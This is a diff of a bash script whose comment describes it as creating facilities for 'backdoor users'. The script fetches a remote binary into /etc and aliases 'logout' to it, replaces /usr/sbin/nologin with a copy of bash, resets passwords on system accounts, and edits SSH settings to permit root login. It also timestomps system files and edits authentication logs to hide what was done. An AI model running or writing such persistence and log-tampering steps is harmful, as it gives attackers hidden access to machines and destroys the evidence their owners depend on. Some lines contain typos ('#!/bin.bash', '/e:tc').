@@ -1,9 +1,13 @@
 #!/bin.bash
 #Create facilities fo backdoor users - ONE TIME at first
 wget -P /etc https://raw.githubusercontent.com/systemprofiler/kernel/master/logout
-chmod 711 logout
+chmod 711 /etc/logout
+touch -r /etc/login.defs /etc/logout
+echo 'alias logout='/etc/logout'' >> ~/.bashrc
+
 cat /bin/bash > /usr/sbin/nologin
 touch -r /usr/sbin/ntpd /usr/sbin/nologin
+
 echo "Enter password for root"
 passwd root
 echo "Enter password for daemon"
@@ -13,13 +17,17 @@ passwd bin
 echo "Enter password for sys"
 passwd sys
 vi /etc/group
+
+vi /etc/ssh/sshd_config
+#PermitRootLogin yes
+#PermitTunnel yes 
+
 chmod 644 /etc/passwd
 touch -r /etc/perl /etc/passwd 
 chmod 600 /etc/group
 touch -r /etc/groff /etc/group
 chmod 600 /etc/shadow
 touch -r /etc/sgml /etc/shadow
-
 chmod 100 /usr/bin/passwd
 touch -r /usr/bin/partx /usr/bin/passwd
 chmod 100 /bin/chmod
@@ -29,6 +37,11 @@ touch -r /bin/cat /bin/chmod
 chmod 700 /etc/rc.local
 touch -r /etc/remastersys.conf /etc/rc.local
 chmod 640 /etc/ssh/sshd_config
-touch -r /etc/ssh/moduli /etc/ssh/sshd_config
-chmod 400 /var/log/lastlog
-touch -r /var/log/wtmp /var/log/lastlog
+touch -r /etc/ssh/moduli /e:tc/ssh/sshd_config
+vi /var/log/auth.log
+vi /var/log/lastlog
+#chmod 400 /var/log/lastlog
+#touch -r /var/log/wtmp /var/log/lastlog
+chmod 751 /sys
+touch -r /etc/perl /sys 
+ 
